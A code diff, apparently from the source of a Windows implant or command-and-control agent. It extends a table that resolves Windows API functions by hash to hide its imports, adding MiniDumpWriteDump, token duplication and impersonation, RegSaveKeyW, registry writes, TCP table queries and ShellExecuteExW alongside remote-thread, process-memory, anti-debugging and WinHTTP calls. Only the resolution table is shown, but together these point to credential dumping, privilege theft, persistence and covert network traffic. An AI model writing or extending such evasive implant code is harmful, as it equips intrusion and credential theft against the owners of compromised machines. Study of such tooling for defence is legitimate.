@@ -251,18 +251,26 @@ namespace Procs
         pProcs->lpCreatePipe                    = reinterpret_cast<LPPROC_CREATEPIPE>(pCreatePipe);
         PVOID pCreateProcessW                   = GetProcAddressByHash(hKernel32DLL, HASH_FUNC_CREATEPROCESSW);
         pProcs->lpCreateProcessW                = reinterpret_cast<LPPROC_CREATEPROCESSW>(pCreateProcessW);
+        PVOID pCreateProcessWithLogonW          = GetProcAddressByHash(hKernel32DLL, HASH_FUNC_CREATEPROCESSWITHLOGONW);
+        pProcs->lpCreateProcessWithLogonW       = reinterpret_cast<LPPROC_CREATEPROCESSWITHLOGONW>(pCreateProcessWithLogonW);
         PVOID pCreateRemoteThreadEx             = GetProcAddressByHash(hKernel32DLL, HASH_FUNC_CREATEREMOTETHREADEX);
         pProcs->lpCreateRemoteThreadEx          = reinterpret_cast<LPPROC_CREATEREMOTETHREADEX>(pCreateRemoteThreadEx);
-        PVOID pGetComputerNameW                 = GetProcAddressByHash(hKernel32DLL, HASH_FUNC_GETCOMPUTERNAMEW);
-        pProcs->lpGetComputerNameW              = reinterpret_cast<LPPROC_GETCOMPUTERNAMEW>(pGetComputerNameW);
+        PVOID pDeleteFileW                      = GetProcAddressByHash(hKernel32DLL, HASH_FUNC_DELETEFILEW);
+        pProcs->lpDeleteFileW                   = reinterpret_cast<LPPROC_DELETEFILEW>(pDeleteFileW);
         PVOID pExpandEnvironmentStringsW        = GetProcAddressByHash(hKernel32DLL, HASH_FUNC_EXPANDENVIRONMENTSTRINGSW);
         pProcs->lpExpandEnvironmentStringsW     = reinterpret_cast<LPPROC_EXPANDENVIRONMENTSTRINGSW>(pExpandEnvironmentStringsW);
         PVOID pFreeEnvironmentStringsW          = GetProcAddressByHash(hKernel32DLL, HASH_FUNC_FREEENVIRONMENTSTRINGSW);
         pProcs->lpFreeEnvironmentStringsW       = reinterpret_cast<LPPROC_FREEENVIRONMENTSTRINGSW>(pFreeEnvironmentStringsW);
+        PVOID pFindClose                        = GetProcAddressByHash(hKernel32DLL, HASH_FUNC_FINDCLOSE);
+        pProcs->lpFindClose                     = reinterpret_cast<LPPROC_FINDCLOSE>(pFindClose);
         PVOID pFindFirstFileW                   = GetProcAddressByHash(hKernel32DLL, HASH_FUNC_FINDFIRSTFILEW);
         pProcs->lpFindFirstFileW                = reinterpret_cast<LPPROC_FINDFIRSTFILEW>(pFindFirstFileW);
         PVOID pFindNextFileW                    = GetProcAddressByHash(hKernel32DLL, HASH_FUNC_FINDNEXTFILEW);
         pProcs->lpFindNextFileW                 = reinterpret_cast<LPPROC_FINDNEXTFILEW>(pFindNextFileW);
+        PVOID pFormatMessage                    = GetProcAddressByHash(hKernel32DLL, HASH_FUNC_FORMATMESSAGE);
+        pProcs->lpFormatMessage                 = reinterpret_cast<LPPROC_FORMATMESSAGE>(pFormatMessage);
+        PVOID pGetComputerNameW                 = GetProcAddressByHash(hKernel32DLL, HASH_FUNC_GETCOMPUTERNAMEW);
+        pProcs->lpGetComputerNameW              = reinterpret_cast<LPPROC_GETCOMPUTERNAMEW>(pGetComputerNameW);
         PVOID pGetEnvironmentStringsW           = GetProcAddressByHash(hKernel32DLL, HASH_FUNC_GETENVIRONMENTSTRINGSW);
         pProcs->lpGetEnvironmentStringsW        = reinterpret_cast<LPPROC_GETENVIRONMENTSTRINGSW>(pGetEnvironmentStringsW);
         PVOID pGetLastError                     = GetProcAddressByHash(hKernel32DLL, HASH_FUNC_GETLASTERROR);
@@ -271,8 +279,14 @@ namespace Procs
         pProcs->lpGetModuleFileNameW            = reinterpret_cast<LPPROC_GETMODULEFILENAMEW>(pGetModuleFileNameW);
         PVOID pGetProcessHeap                   = GetProcAddressByHash(hKernel32DLL, HASH_FUNC_GETPROCESSHEAP);
         pProcs->lpGetProcessHeap                = reinterpret_cast<LPPROC_GETPROCESSHEAP>(pGetProcessHeap);
+        PVOID pGetProcessImageFileNameW         = GetProcAddressByHash(hKernel32DLL, HASH_FUNC_GETPROCESSIMAGEFILENAMEW);
+        pProcs->lpGetProcessImageFileNameW       = reinterpret_cast<LPPROC_GETPROCESSIMAGEFILENAMEW>(pGetProcessImageFileNameW);
         PVOID pGetSystemDirectoryW              = GetProcAddressByHash(hKernel32DLL, HASH_FUNC_GETSYSTEMDIRECTORYW);
         pProcs->lpGetSystemDirectoryW           = reinterpret_cast<LPPROC_GETSYSTEMDIRECTORYW>(pGetSystemDirectoryW);
+        PVOID pGlobalAlloc                      = GetProcAddressByHash(hKernel32DLL, HASH_FUNC_GLOBALALLOC);
+        pProcs->lpGlobalAlloc                   = reinterpret_cast<LPPROC_GLOBALALLOC>(pGlobalAlloc);
+        PVOID pGlobalFree                       = GetProcAddressByHash(hKernel32DLL, HASH_FUNC_GLOBALFREE);
+        pProcs->lpGlobalFree                    = reinterpret_cast<LPPROC_GLOBALFREE>(pGlobalFree);
         PVOID pHeapAlloc                        = GetProcAddressByHash(hKernel32DLL, HASH_FUNC_HEAPALLOC);
         pProcs->lpHeapAlloc                     = reinterpret_cast<LPPROC_HEAPALLOC>(pHeapAlloc);
         PVOID pHeapFree                         = GetProcAddressByHash(hKernel32DLL, HASH_FUNC_HEAPFREE);
@@ -281,18 +295,22 @@ namespace Procs
         pProcs->lpLoadLibraryA                  = reinterpret_cast<LPPROC_LOADLIBRARYA>(pLoadLibraryA);
         PVOID pLoadLibraryW                     = GetProcAddressByHash(hKernel32DLL, HASH_FUNC_LOADLIBRARYW);
         pProcs->lpLoadLibraryW                  = reinterpret_cast<LPPROC_LOADLIBRARYW>(pLoadLibraryW);
+        PVOID pLocalFree                        = GetProcAddressByHash(hKernel32DLL, HASH_FUNC_LOCALFREE);
+        pProcs->lpLocalFree                     = reinterpret_cast<LPPROC_LOCALFREE>(pLocalFree);
         PVOID pIsDebuggerPresent                = GetProcAddressByHash(hKernel32DLL, HASH_FUNC_ISDEBUGGERPRESENT);
         pProcs->lpIsDebuggerPresent             = reinterpret_cast<LPPROC_ISDEBUGGERPRESENT>(pIsDebuggerPresent);
+        PVOID pMoveFileW                        = GetProcAddressByHash(hKernel32DLL, HASH_FUNC_MOVEFILEW);
+        pProcs->lpMoveFileW                     = reinterpret_cast<LPPROC_MOVEFILEW>(pMoveFileW);
         PVOID pOpenProcess                      = GetProcAddressByHash(hKernel32DLL, HASH_FUNC_OPENPROCESS);
         pProcs->lpOpenProcess                   = reinterpret_cast<LPPROC_OPENPROCESS>(pOpenProcess);
-        PVOID pOpenProcessToken                 = GetProcAddressByHash(hKernel32DLL, HASH_FUNC_OPENPROCESSTOKEN);
-        pProcs->lpOpenProcessToken              = reinterpret_cast<LPPROC_OPENPROCESSTOKEN>(pOpenProcessToken);
         PVOID pQueryFullProcessImageNameW       = GetProcAddressByHash(hKernel32DLL, HASH_FUNC_QUERYFULLPROCESSIMAGENAMEW);
         pProcs->lpQueryFullProcessImageNameW    = reinterpret_cast<LPPROC_QUERYFULLPROCESSIMAGENAMEW>(pQueryFullProcessImageNameW);
         PVOID pReadFile                         = GetProcAddressByHash(hKernel32DLL, HASH_FUNC_READFILE);
         pProcs->lpReadFile                      = reinterpret_cast<LPPROC_READFILE>(pReadFile);
         PVOID pReadProcessMemory                = GetProcAddressByHash(hKernel32DLL, HASH_FUNC_READPROCESSMEMORY);
         pProcs->lpReadProcessMemory             = reinterpret_cast<LPPROC_READPROCESSMEMORY>(pReadProcessMemory);
+        PVOID pRemoveDirectoryW                 = GetProcAddressByHash(hKernel32DLL, HASH_FUNC_REMOVEDIRECTORYW);
+        pProcs->lpRemoveDirectoryW              = reinterpret_cast<LPPROC_REMOVEDIRECTORYW>(pRemoveDirectoryW);
         PVOID pRtlCopyMemory                    = GetProcAddressByHash(hKernel32DLL, HASH_FUNC_RTLCOPYMEMORY);
         pProcs->lpRtlCopyMemory                 = reinterpret_cast<LPPROC_RTLCOPYMEMORY>(pRtlCopyMemory);
         PVOID pSetFileInformationByHandle       = GetProcAddressByHash(hKernel32DLL, HASH_FUNC_SETFILEINFORMATIONBYHANDLE);
@@ -362,26 +380,52 @@ namespace Procs
         HMODULE hAdvapi32DLL,
         HMODULE hBcryptDLL,
         HMODULE hCrypt32DLL,
+        HMODULE hDbghelpDLL,
+        HMODULE hIphlpapiDLL,
         HMODULE hNetapi32DLL,
+        HMODULE hShell32DLL,
+        HMODULE hUser32DLL,
         HMODULE hWinHTTPDLL
     ) {
         // Advapi32
-        PVOID pGetUserNameW                     = GetProcAddressByHash(hAdvapi32DLL, HASH_FUNC_GETUSERNAMEW);
-        pProcs->lpGetUserNameW                  = reinterpret_cast<LPPROC_GETUSERNAMEW>(pGetUserNameW);
         PVOID pAdjustTokenPrivileges            = GetProcAddressByHash(hAdvapi32DLL, HASH_FUNC_ADJUSTTOKENPRIVILEGES);
         pProcs->lpAdjustTokenPrivileges         = reinterpret_cast<LPPROC_ADJUSTTOKENPRIVILEGES>(pAdjustTokenPrivileges);
+        PVOID pCreateProcessWithTokenW          = GetProcAddressByHash(hAdvapi32DLL, HASH_FUNC_CREATEPROCESSWITHTOKENW);
+        pProcs->lpCreateProcessWithTokenW       = reinterpret_cast<LPPROC_CREATEPROCESSWITHTOKENW>(pCreateProcessWithTokenW);
+        PVOID pDuplicateTokenEx                 = GetProcAddressByHash(hAdvapi32DLL, HASH_FUNC_DUPLICATETOKENEX);
+        pProcs->lpDuplicateTokenEx              = reinterpret_cast<LPPROC_DUPLICATETOKENEX>(pDuplicateTokenEx);
+        PVOID pGetTokenInformation              = GetProcAddressByHash(hAdvapi32DLL, HASH_FUNC_GETTOKENINFORMATION);
+        pProcs->lpGetTokenInformation           = reinterpret_cast<LPPROC_GETTOKENINFORMATION>(pGetTokenInformation);
+        PVOID pGetUserNameW                     = GetProcAddressByHash(hAdvapi32DLL, HASH_FUNC_GETUSERNAMEW);
+        pProcs->lpGetUserNameW                  = reinterpret_cast<LPPROC_GETUSERNAMEW>(pGetUserNameW);
+        PVOID pImpersonateLoggedOnUser          = GetProcAddressByHash(hAdvapi32DLL, HASH_FUNC_IMPERSONATELOGGEDONUSER);
+        pProcs->lpImpersonateLoggedOnUser       = reinterpret_cast<LPPROC_IMPERSONATELOGGEDONUSER>(pImpersonateLoggedOnUser);
+        PVOID pLookupPrivilegeNameW             = GetProcAddressByHash(hAdvapi32DLL, HASH_FUNC_LOOKUPPRIVILEGENAMEW);
+        pProcs->lpLookupPrivilegeNameW          = reinterpret_cast<LPPROC_LOOKUPPRIVILEGENAMEW>(pLookupPrivilegeNameW);
         PVOID pLookupPrivilegeValueW            = GetProcAddressByHash(hAdvapi32DLL, HASH_FUNC_LOOKUPPRIVILEGEVALUEW);
         pProcs->lpLookupPrivilegeValueW         = reinterpret_cast<LPPROC_LOOKUPPRIVILEGEVALUEW>(pLookupPrivilegeValueW);
+        PVOID pOpenProcessToken                 = GetProcAddressByHash(hAdvapi32DLL, HASH_FUNC_OPENPROCESSTOKEN);
+        pProcs->lpOpenProcessToken              = reinterpret_cast<LPPROC_OPENPROCESSTOKEN>(pOpenProcessToken);
         PVOID pPrivilegeCheck                   = GetProcAddressByHash(hAdvapi32DLL, HASH_FUNC_PRIVILEGECHECK);
         pProcs->lpPrivilegeCheck                = reinterpret_cast<LPPROC_PRIVILEGECHECK>(pPrivilegeCheck);
         PVOID pRegCloseKey                      = GetProcAddressByHash(hAdvapi32DLL, HASH_FUNC_REGCLOSEKEY);
         pProcs->lpRegCloseKey                   = reinterpret_cast<LPPROC_REGCLOSEKEY>(pRegCloseKey);
+        PVOID pRegCreateKeyExW                  = GetProcAddressByHash(hAdvapi32DLL, HASH_FUNC_REGCREATEKEYEXW);
+        pProcs->lpRegCreateKeyExW               = reinterpret_cast<LPPROC_REGCREATEKEYEXW>(pRegCreateKeyExW);
         PVOID pRegEnumKeyExW                    = GetProcAddressByHash(hAdvapi32DLL, HASH_FUNC_REGENUMKEYEXW);
         pProcs->lpRegEnumKeyExW                 = reinterpret_cast<LPPROC_REGENUMKEYEXW>(pRegEnumKeyExW);
+        PVOID pRegEnumValueW                    = GetProcAddressByHash(hAdvapi32DLL, HASH_FUNC_REGENUMVALUEW);
+        pProcs->lpRegEnumValueW                 = reinterpret_cast<LPPROC_REGENUMVALUEW>(pRegEnumValueW);
         PVOID pRegOpenKeyExW                    = GetProcAddressByHash(hAdvapi32DLL, HASH_FUNC_REGOPENKEYEXW);
         pProcs->lpRegOpenKeyExW                 = reinterpret_cast<LPPROC_REGOPENKEYEXW>(pRegOpenKeyExW);
         PVOID pRegQueryInfoKeyW                 = GetProcAddressByHash(hAdvapi32DLL, HASH_FUNC_REGQUERYINFOKEYW);
         pProcs->lpRegQueryInfoKeyW              = reinterpret_cast<LPPROC_REGQUERYINFOKEYW>(pRegQueryInfoKeyW);
+        PVOID pRegSaveKeyW                      = GetProcAddressByHash(hAdvapi32DLL, HASH_FUNC_REGSAVEKEYW);
+        pProcs->lpRegSaveKeyW                   = reinterpret_cast<LPPROC_REGSAVEKEYW>(pRegSaveKeyW);
+        PVOID pRegSetValueExW                   = GetProcAddressByHash(hAdvapi32DLL, HASH_FUNC_REGSETVALUEEXW);
+        pProcs->lpRegSetValueExW                = reinterpret_cast<LPPROC_REGSETVALUEEXW>(pRegSetValueExW);
+        PVOID pRevertToSelf                     = GetProcAddressByHash(hAdvapi32DLL, HASH_FUNC_REVERTTOSELF);
+        pProcs->lpRevertToSelf                  = reinterpret_cast<LPPROC_REVERTTOSELF>(pRevertToSelf);
 
         // Bcrypt
         PVOID pBCryptCloseAlgorithmProvider     = GetProcAddressByHash(hBcryptDLL, HASH_FUNC_BCRYPTCLOSEALGORITHMPROVIDER);
@@ -407,6 +451,16 @@ namespace Procs
         PVOID pCryptStringToBinaryW             = GetProcAddressByHash(hCrypt32DLL, HASH_FUNC_CRYPTSTRINGTOBINARYW);
         pProcs->lpCryptStringToBinaryW          = reinterpret_cast<LPPROC_CRYPTSTRINGTOBINARYW>(pCryptStringToBinaryW);
 
+        // Dbghelp
+        PVOID pMiniDumpWriteDump                = GetProcAddressByHash(hDbghelpDLL, HASH_FUNC_MINIDUMPWRITEDUMP);
+        pProcs->lpMiniDumpWriteDump             = reinterpret_cast<LPPROC_MINIDUMPWRITEDUMP>(pMiniDumpWriteDump);
+
+        // Iphlpapi
+        PVOID pGetAdaptersAddresses             = GetProcAddressByHash(hIphlpapiDLL, HASH_FUNC_GETADAPTERSADDRESSES);
+        pProcs->lpGetAdaptersAddresses          = reinterpret_cast<LPPROC_GETADAPTERSADDRESSES>(pGetAdaptersAddresses);
+        PVOID pGetTcpTable                      = GetProcAddressByHash(hIphlpapiDLL, HASH_FUNC_GETTCPTABLE);
+        pProcs->lpGetTcpTable                   = reinterpret_cast<LPPROC_GETTCPTABLE>(pGetTcpTable);
+
         // Netapi32
         PVOID pNetApiBufferFree                 = GetProcAddressByHash(hNetapi32DLL, HASH_FUNC_NETAPIBUFFERFREE);
         pProcs->lpNetApiBufferFree              = reinterpret_cast<LPPROC_NETAPIBUFFERFREE>(pNetApiBufferFree);
@@ -414,6 +468,38 @@ namespace Procs
         pProcs->lpNetLocalGroupEnum             = reinterpret_cast<LPPROC_NETLOCALGROUPENUM>(pNetLocalGroupEnum);
         PVOID pNetUserEnum                      = GetProcAddressByHash(hNetapi32DLL, HASH_FUNC_NETUSERENUM);
         pProcs->lpNetUserEnum                   = reinterpret_cast<LPPROC_NETUSERENUM>(pNetUserEnum);
+
+        // Shell32
+        PVOID pShellExecuteExW                  = GetProcAddressByHash(hShell32DLL, HASH_FUNC_SHELLEXECUTEEXW);
+        pProcs->lpShellExecuteExW               = reinterpret_cast<LPPROC_SHELLEXECUTEEXW>(pShellExecuteExW);
+
+        // User32
+        PVOID pCreateWindowExW                  = GetProcAddressByHash(hUser32DLL, HASH_FUNC_CREATEWINDOWEXW);
+        pProcs->lpCreateWindowExW               = reinterpret_cast<LPPROC_CREATEWINDOWEXW>(pCreateWindowExW);
+        // PVOID pDispatchMessage                  = GetProcAddressByHash(hUser32DLL, HASH_FUNC_DISPATCHMESSAGE);
+        // pProcs->lpDispatchMessage               = reinterpret_cast<LPPROC_DISPATCHMESSAGE>(pDispatchMessage);
+        PVOID pGetForegroundWindow              = GetProcAddressByHash(hUser32DLL, HASH_FUNC_GETFOREGROUNDWINDOW);
+        pProcs->lpGetForegroundWindow           = reinterpret_cast<LPPROC_GETFOREGROUNDWINDOW>(pGetForegroundWindow);
+        // PVOID pGetMessage                       = GetProcAddressByHash(hUser32DLL, HASH_FUNC_GETMESSAGE);
+        // pProcs->lpGetMessage                    = reinterpret_cast<LPPROC_GETMESSAGE>(pGetMessage);
+        PVOID pGetSystemMetrics                 = GetProcAddressByHash(hUser32DLL, HASH_FUNC_GETSYSTEMMETRICS);
+        pProcs->lpGetSystemMetrics              = reinterpret_cast<LPPROC_GETSYSTEMMETRICS>(pGetSystemMetrics);
+        PVOID pLoadAcceleratorsW                = GetProcAddressByHash(hUser32DLL, HASH_FUNC_LOADACCELERATORSW);
+        pProcs->lpLoadAcceleratorsW             = reinterpret_cast<LPPROC_LOADACCELERATORSW>(pLoadAcceleratorsW);
+        PVOID pLoadCursorW                      = GetProcAddressByHash(hUser32DLL, HASH_FUNC_LOADCURSORW);
+        pProcs->lpLoadCursorW                   = reinterpret_cast<LPPROC_LOADCURSORW>(pLoadCursorW);
+        PVOID pLoadIconW                        = GetProcAddressByHash(hUser32DLL, HASH_FUNC_LOADICONW);
+        pProcs->lpLoadIconW                     = reinterpret_cast<LPPROC_LOADICONW>(pLoadIconW);
+        PVOID pRegisterClassExW                 = GetProcAddressByHash(hUser32DLL, HASH_FUNC_REGISTERCLASSEXW);
+        pProcs->lpRegisterClassExW              = reinterpret_cast<LPPROC_REGISTERCLASSEXW>(pRegisterClassExW);
+        PVOID pShowWindow                       = GetProcAddressByHash(hUser32DLL, HASH_FUNC_SHOWWINDOW);
+        pProcs->lpShowWindow                    = reinterpret_cast<LPPROC_SHOWWINDOW>(pShowWindow);
+        PVOID pTranslateAcceleratorW            = GetProcAddressByHash(hUser32DLL, HASH_FUNC_TRANSLATEACCELERATORW);
+        pProcs->lpTranslateAcceleratorW         = reinterpret_cast<LPPROC_TRANSLATEACCELERATORW>(pTranslateAcceleratorW);
+        PVOID pTranslateMessage                 = GetProcAddressByHash(hUser32DLL, HASH_FUNC_TRANSLATEMESSAGE);
+        pProcs->lpTranslateMessage              = reinterpret_cast<LPPROC_TRANSLATEMESSAGE>(pTranslateMessage);
+        PVOID pUpdateWindow                     = GetProcAddressByHash(hUser32DLL, HASH_FUNC_UPDATEWINDOW);
+        pProcs->lpUpdateWindow                  = reinterpret_cast<LPPROC_UPDATEWINDOW>(pUpdateWindow);
 
         // WinHttp
         PVOID pWinHttpCloseHandle               = GetProcAddressByHash(hWinHTTPDLL, HASH_FUNC_WINHTTPCLOSEHANDLE);
@@ -437,6 +523,6 @@ namespace Procs
         PVOID pWinHttpSetOption                 = GetProcAddressByHash(hWinHTTPDLL, HASH_FUNC_WINHTTPSETOPTION);
         pProcs->lpWinHttpSetOption              = reinterpret_cast<LPPROC_WINHTTPSETOPTION>(pWinHttpSetOption);
         PVOID pWinHttpWriteData                 = GetProcAddressByHash(hWinHTTPDLL, HASH_FUNC_WINHTTPWRITEDATA);
-        pProcs->lpWinHttpWriteData              = reinterpret_cast<LPPROC_WINHTTPWRITEDATA>(pWinHttpWriteData);
+        pProcs->lpWinHttpWriteData              = reinterpret_cast<LPPROC_WINHTTPWRITEDATA>(pWinHttpWriteData);    
     }
 }
